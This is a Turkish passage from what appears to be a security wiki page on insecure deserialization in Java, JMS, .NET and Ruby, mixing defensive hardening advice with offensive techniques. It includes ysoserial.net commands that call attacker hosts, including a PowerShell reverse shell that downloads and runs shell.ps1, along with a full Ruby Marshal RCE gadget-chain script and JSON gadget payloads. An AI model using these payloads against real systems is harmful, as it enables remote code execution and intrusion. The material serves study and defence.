Belirli **nesnelerin sınıf hiyerarşisi nedeniyle `Serializable`** arayüzünü uygulaması gereken senaryolarda, istemeden serileştirme riski vardır. Bunu önlemek için, aşağıda gösterildiği gibi, sürekli bir istisna fırlatan `final` bir `readObject()` yöntemi tanımlayarak bu nesnelerin serileştirilemez olmasını sağlayın:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Java'da Deserialization Güvenliğini Artırma**

**`java.io.ObjectInputStream`'i Özelleştirmek**, deserialization süreçlerini güvence altına almak için pratik bir yaklaşımdır. Bu yöntem, aşağıdaki durumlarda uygundur:

- Deserialization kodu kontrolünüz altındadır.
- Deserialization için beklenen sınıflar biliniyor.

Sadece izin verilen sınıflara deserialization'ı sınırlamak için **`resolveClass()`** yöntemini geçersiz kılın. Bu, yalnızca açıkça izin verilen sınıfların, örneğin deserialization'ı yalnızca `Bicycle` sınıfı ile sınırlayan aşağıdaki örnekte olduğu gibi, deserialization'ını önler:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Güvenlik Artırımı için Java Ajansı Kullanımı**, kod değişikliği mümkün olmadığında bir geri dönüş çözümü sunar. Bu yöntem esasen **zararlı sınıfları kara listeye alma** için bir JVM parametresi kullanır:
```
-javaagent:name-of-agent.jar
```
Dinamik olarak deserialization'ı güvence altına almanın bir yolunu sağlar, anlık kod değişikliklerinin pratik olmadığı ortamlarda idealdir.

Bir örneği kontrol edin [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Serileştirme Filtrelerinin Uygulanması**: Java 9, **`ObjectInputFilter`** arayüzü aracılığıyla serileştirme filtrelerini tanıttı ve serileştirilmiş nesnelerin deserialization'dan önce karşılaması gereken kriterleri belirlemek için güçlü bir mekanizma sağladı. Bu filtreler, deserialization süreci üzerinde ayrıntılı kontrol sunarak küresel veya akış başına uygulanabilir.

Serileştirme filtrelerini kullanmak için, tüm deserialization işlemlerine uygulanan küresel bir filtre ayarlayabilir veya belirli akışlar için dinamik olarak yapılandırabilirsiniz. Örneğin:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Dış Kütüphaneleri Güvenliği Artırmak İçin Kullanma**: **NotSoSerial**, **jdeserialize** ve **Kryo** gibi kütüphaneler, Java deserialization'ını kontrol etme ve izleme için gelişmiş özellikler sunar. Bu kütüphaneler, deserialization'dan önce serileştirilmiş nesneleri analiz etme, sınıfları beyaz listeye alma veya kara listeye alma gibi ek güvenlik katmanları sağlayabilir ve özel serileştirme stratejileri uygulayabilir.

- **NotSoSerial**, güvenilmeyen kodun çalıştırılmasını önlemek için deserialization süreçlerini kesintiye uğratır.
- **jdeserialize**, serileştirilmiş Java nesnelerinin deserialization'ını yapmadan analiz edilmesine olanak tanır ve potansiyel olarak zararlı içeriği tanımlamaya yardımcı olur.
- **Kryo**, hız ve verimliliğe vurgu yapan alternatif bir serileştirme çerçevesidir ve güvenliği artırabilecek yapılandırılabilir serileştirme stratejileri sunar.

### Referanslar

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization ve ysoserial konuşması: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Gadgetinspector hakkında konuşma: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ve slaytlar: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec makalesi: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java ve .Net JSON deserialization **makalesi:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** konuşma: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ve slaytlar: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialization CVE'leri: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Enjeksiyonu & log4Shell

**JNDI Enjeksiyonu nedir, RMI, CORBA & LDAP aracılığıyla nasıl kötüye kullanılır ve log4shell'i nasıl istismar edilir** (ve bu zafiyetin bir örneği) hakkında bilgi için aşağıdaki sayfayı ziyaret edin:

{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Mesaj Servisi

> **Java Mesaj Servisi** (**JMS**) API'si, iki veya daha fazla istemci arasında mesaj göndermek için kullanılan bir Java mesaj odaklı ara yazılım API'sidir. Üretici-tüketici sorununu çözmek için bir uygulamadır. JMS, Java Platformu, Kurumsal Sürümü (Java EE) bir parçasıdır ve Sun Microsystems tarafından geliştirilen bir spesifikasyonla tanımlanmıştır, ancak o zamandan beri Java Topluluk Süreci tarafından yönlendirilmiştir. Java EE tabanlı uygulama bileşenlerinin mesaj oluşturmasına, göndermesine, almasına ve okumasına olanak tanıyan bir mesajlaşma standardıdır. Dağıtık bir uygulamanın farklı bileşenleri arasında iletişimin gevşek bir şekilde bağlı, güvenilir ve asenkron olmasını sağlar. (Kaynak: [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Ürünler

Bu ara yazılımı kullanarak mesaj gönderen birkaç ürün bulunmaktadır:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### İstismar

Temelde, **tehlikeli bir şekilde JMS kullanan birçok hizmet bulunmaktadır**. Bu nedenle, bu hizmetlere mesaj göndermek için **yeterli ayrıcalıklara** sahipseniz (genellikle geçerli kimlik bilgilerine ihtiyacınız olacaktır), **tüketici/abone tarafından deserialization yapılacak kötü niyetli serileştirilmiş nesneler gönderebilirsiniz**.\
Bu, bu istismar sırasında **o mesajı kullanacak tüm istemcilerin enfekte olacağı** anlamına gelir.

Bir hizmetin zayıf olduğunu hatırlamalısınız (çünkü kullanıcı girdisini güvensiz bir şekilde deserialization yapıyorsa) ancak yine de zafiyeti istismar etmek için geçerli gadget'lar bulmanız gerekir.

[JMET](https://github.com/matthiaskaiser/jmet) aracı, **bilinen gadget'lar kullanarak birkaç kötü niyetli serileştirilmiş nesne göndererek bu hizmetlere bağlanmak ve saldırmak için** oluşturulmuştur. Bu istismarlar, hizmet hala zayıfsa ve kullanılan gadget'lardan herhangi biri zayıf uygulamanın içinde bulunuyorsa çalışacaktır.

### Referanslar

- JMET konuşması: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slaytlar: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Net bağlamında, deserialization istismarları, bir nesnenin deserialization'ı sırasında belirli kodları çalıştırmak için gadget'ların istismar edilmesi gibi çalışır.

### Parmak İzi

#### Beyaz Kutu

Kaynak kodu, aşağıdaki durumların varlığı için incelenmelidir:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Odak, türün kullanıcı kontrolündeki bir değişken tarafından belirlenmesine izin veren serileştiriciler üzerinde olmalıdır.

#### Siyah Kutu

Arama, sunucu tarafında deserialization yapılabilecek **AAEAAAD/////** veya benzeri bir Base64 kodlu dizeyi hedef almalıdır; bu, deserialization yapılacak tür üzerinde kontrol sağlar. Bu, `TypeObject` veya `$type` içeren **JSON** veya **XML** yapıları gibi olabilir.

### ysoserial.net

Bu durumda, **deserialization istismarlarını oluşturmak için** [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) aracını kullanabilirsiniz. Git deposunu indirdikten sonra, aracı **Visual Studio gibi bir programla derlemelisiniz**.

**ysoserial.net'in istismarını nasıl oluşturduğunu öğrenmek istiyorsanız**, [**ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter'ın açıklandığı bu sayfayı kontrol edebilirsiniz**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

**ysoserial.net**'in ana seçenekleri: **`--gadget`**, **`--formatter`**, **`--output`** ve **`--plugin`.**

- **`--gadget`**, istismar edilecek gadget'ı belirtmek için kullanılır (deserialization sırasında komutları çalıştırmak için istismar edilecek sınıf/fonksiyonu belirtir).
- **`--formatter`**, istismarı serileştirmek için kullanılacak yöntemi belirtir (payload'ı deserialization yapmak için arka uçta hangi kütüphanenin kullanıldığını bilmeniz ve aynı kütüphaneyi kullanarak serileştirmeniz gerekir).
- **`--output`**, istismarı **ham** veya **base64** kodlu olarak almak isteyip istemediğinizi belirtmek için kullanılır. _Not: **ysoserial.net**, payload'ı **UTF-16LE** kullanarak **kodlayacaktır** (Windows'ta varsayılan olarak kullanılan kodlama), bu nedenle ham veriyi alıp sadece bir linux konsolundan kodlarsanız, istismarın düzgün çalışmasını engelleyecek bazı **kodlama uyumluluk sorunları** yaşayabilirsiniz (HTB JSON kutusunda payload hem UTF-16LE hem de ASCII'de çalıştı ama bu her zaman çalışacağı anlamına gelmez)._
- **`--plugin`**, ysoserial.net, **belirli çerçeveler için istismarlar oluşturmak üzere eklentileri destekler**; örneğin ViewState.

#### Daha fazla ysoserial.net parametreleri

- `--minify`, **daha küçük bir payload** sağlayacaktır (mümkünse).
- `--raf -f Json.Net -c "anything"` Bu, sağlanan bir formatter ile kullanılabilecek tüm gadget'ları gösterecektir (bu durumda `Json.Net`).
- `--sf xml`, bir gadget'ı (`-g`) belirtebilir ve ysoserial.net "xml" içeren formatörleri arayacaktır (büyük/küçük harf duyarsız). 

**ysoserial örnekleri** ile istismar oluşturma:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ayrıca her bir exploitin nasıl çalıştığını daha iyi anlamaya yardımcı olan **çok ilginç bir parametreye** sahiptir: `--test`\
Bu parametreyi belirtirseniz **ysoserial.net** **exploit'i yerel olarak deneyecektir,** böylece payload'unuzun doğru çalışıp çalışmadığını test edebilirsiniz.\
Bu parametre faydalıdır çünkü kodu gözden geçirirseniz aşağıdaki gibi kod parçaları bulacaksınız ( [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Bu, istismarı test etmek için kodun [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) çağıracağı anlamına gelir.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
**Önceki kod, oluşturulan istismara karşı savunmasızdır.** Bu nedenle, bir .Net uygulamasında benzer bir şey bulursanız, muhtemelen o uygulama da savunmasızdır.\
Bu nedenle **`--test`** parametresi, **hangi kod parçalarının** deserialization istismarına karşı savunmasız olduğunu anlamamıza olanak tanır **ysoserial.net** tarafından oluşturulabilir.

### ViewState

[**.Net'in \_\_ViewState parametresini istismar etmeye nasıl çalışılacağı hakkında bu POST'a**](exploiting-__viewstate-parameter.md) bakın **rastgele kod çalıştırmak için.** Eğer **kurban makinesinin** kullandığı sırları **zaten biliyorsanız**, [**kod çalıştırmayı öğrenmek için bu yazıyı okuyun**](exploiting-__viewstate-knowing-the-secret.md)**.**

### Önleme

.Net'te deserialization ile ilişkili riskleri azaltmak için:

- **Veri akışlarının nesne türlerini tanımlamasına izin vermekten kaçının.** Mümkünse `DataContractSerializer` veya `XmlSerializer` kullanın.
- **`JSON.Net` için `TypeNameHandling`'i `None` olarak ayarlayın:** %%%TypeNameHandling = TypeNameHandling.None%%%
- **`JavaScriptSerializer`'ı `JavaScriptTypeResolver` ile kullanmaktan kaçının.**
- **Deserialized edilebilecek türleri sınırlayın**, `System.IO.FileInfo` gibi .Net türleri ile ilişkili riskleri anlayarak, bu türler sunucu dosyalarının özelliklerini değiştirebilir ve hizmet reddi saldırılarına yol açabilir.
- **Riskli özelliklere sahip türlerle dikkatli olun**, `Value` özelliği ile `System.ComponentModel.DataAnnotations.ValidationException` gibi, istismar edilebilir.
- **Tür örneklemesini güvenli bir şekilde kontrol edin** ki saldırganlar deserialization sürecini etkilemesin, bu da `DataContractSerializer` veya `XmlSerializer`'ı savunmasız hale getirebilir.
- **`BinaryFormatter` ve `JSON.Net` için özel bir `SerializationBinder` kullanarak beyaz liste kontrolleri uygulayın.**
- **.Net içinde bilinen güvensiz deserialization aletleri hakkında bilgi sahibi olun** ve deserializer'ların bu türleri örneklemediğinden emin olun.
- **Potansiyel olarak riskli kodu** internet erişimi olan koddan izole edin, böylece bilinen aletlerin, örneğin WPF uygulamalarındaki `System.Windows.Data.ObjectDataProvider`, güvensiz veri kaynaklarına maruz kalmasını önleyin.

### **Referanslar**

- Java ve .Net JSON deserialization **belgesi:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** konuşma: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ve slaytlar: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby'de, serialization **marshal** kütüphanesindeki iki yöntemle sağlanır. İlk yöntem, **dump** olarak bilinir ve bir nesneyi bir bayt akışına dönüştürmek için kullanılır. Bu işleme serialization denir. Tersine, ikinci yöntem **load** olarak adlandırılır ve bir bayt akışını tekrar bir nesneye döndürmek için kullanılır, bu işleme ise deserialization denir.

Serileştirilmiş nesneleri güvence altına almak için, **Ruby HMAC (Hash-Based Message Authentication Code)** kullanır ve verilerin bütünlüğünü ve doğruluğunu sağlar. Bu amaçla kullanılan anahtar, birkaç olası konumdan birinde saklanır:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X genel deserialization'dan RCE alet zincirine (daha fazla bilgi için** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Diğer RCE zinciri Ruby On Rails'i istismar etmek için: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() metodu

[**bu güvenlik açığı raporunda**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/) açıklandığı gibi, eğer bazı kullanıcıdan gelen temizlenmemiş girdi bir ruby nesnesinin `.send()` metoduna ulaşırsa, bu metod nesnenin **herhangi bir diğer metodunu** herhangi bir parametre ile çağırmaya izin verir.

Örneğin, eval çağırmak ve ardından ruby kodunu ikinci parametre olarak vermek, rastgele kodun çalıştırılmasına olanak tanır:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Ayrıca, **`.send()`** yönteminin yalnızca bir parametresi bir saldırgan tarafından kontrol ediliyorsa, önceki yazıda belirtildiği gibi, **argüman gerektirmeyen** veya argümanlarının **varsayılan değerleri** olan herhangi bir nesne yöntemini çağırmak mümkündür.\
Bunun için, bu gereksinimleri karşılayan **ilginç yöntemleri bulmak üzere nesnenin tüm yöntemlerini saymak** mümkündür.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby sınıf kirlenmesi

Bir Ruby sınıfını nasıl [kirletebileceğinizi ve bunu burada nasıl kötüye kullanabileceğinizi kontrol edin](ruby-class-pollution.md).

### Ruby _json kirlenmesi

Bir gövdeye, bir dizi gibi hashlenemeyen bazı değerler gönderildiğinde, bunlar `_json` adlı yeni bir anahtara eklenecektir. Ancak, bir saldırganın gövdeye istediği keyfi değerlerle `_json` adlı bir değer de ayarlaması mümkündür. Ardından, örneğin arka uç bir parametrenin doğruluğunu kontrol ederse ancak `_json` parametresini bir eylem gerçekleştirmek için de kullanırsa, bir yetkilendirme atlatması gerçekleştirilebilir.

Daha fazla bilgi için [Ruby _json kirlenmesi sayfasını](ruby-_json-pollution.md) kontrol edin.

### Diğer kütüphaneler

Bu teknik [**bu blog yazısından**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared) alınmıştır.

RCE elde etmek için güvenli olmayan bir deserialization sırasında kötüye kullanılabilecek nesneleri serileştirmek için kullanılabilecek başka Ruby kütüphaneleri vardır. Aşağıdaki tablo, bu kütüphanelerden bazılarını ve yüklenen kütüphaneden her zaman serileştirilmediğinde çağrılan yöntemleri göstermektedir (temelde RCE elde etmek için kötüye kullanılacak fonksiyon):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Kütüphane</strong></td><td><strong>Girdi verisi</strong></td><td><strong>Sınıf içindeki başlatma yöntemi</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (sınıfın hash(map) içinde anahtar olarak yer alması gerekir)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (sınıfın hash(map) içinde anahtar olarak yer alması gerekir)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (sınıfın hash(map) içinde anahtar olarak yer alması gerekir)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([json_create ile ilgili notları son bölümde görün](#table-vulnerable-sinks))</td></tr></tbody></table>

Temel örnek:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Oj'yi kötüye kullanmaya çalışırken, `hash` fonksiyonu içinde `to_s` çağrısı yapan bir gadget sınıfı bulmak mümkün oldu. Bu, spec'i çağıracak ve fetch_path'i çağıracak şekildeydi; bu da rastgele bir URL almasını sağladı ve bu tür temizlenmemiş deserialization zafiyetlerinin harika bir dedektörü oldu.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Ayrıca, önceki teknikle sistemde bir klasörün de oluşturulduğu, bunun başka bir gadget'ı istismar etmek için bir gereklilik olduğu ve bunun bir RCE'ye dönüştürülmesi gerektiği bulundu:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Daha fazla detay için [**orijinal gönderiye**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared) bakın.

{{#include ../../banners/hacktricks-training.md}}
